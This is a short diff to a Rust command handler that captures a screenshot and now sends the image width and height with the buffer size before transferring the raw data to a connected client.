@@ -1,5 +1,5 @@
 use super::prelude::*;
-use crate::utils;
+use crate::screenshot;
 use std::cmp::min;
 
 pub struct ScreenshotBeta;
@@ -19,11 +19,18 @@ impl Command for ScreenshotBeta {
     }
 
     async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
-        let buffer = utils::screenshot_buffer()?;
+        let screenshot = screenshot::screenshot()?;
+
+        let buffer = screenshot.buffer;
 
         client.send_command("/noping")?;
 
-        client.send(ok(buffer.len().to_string()))?;
+        client.send(ok(format!(
+            "{} {} {}",
+            screenshot.width,
+            screenshot.height,
+            buffer.len().to_string()
+        )))?;
 
         if String::from(client.receive()?) == "OK" {
             client.send_command(format!("/rawdata {}", buffer.len()))?;
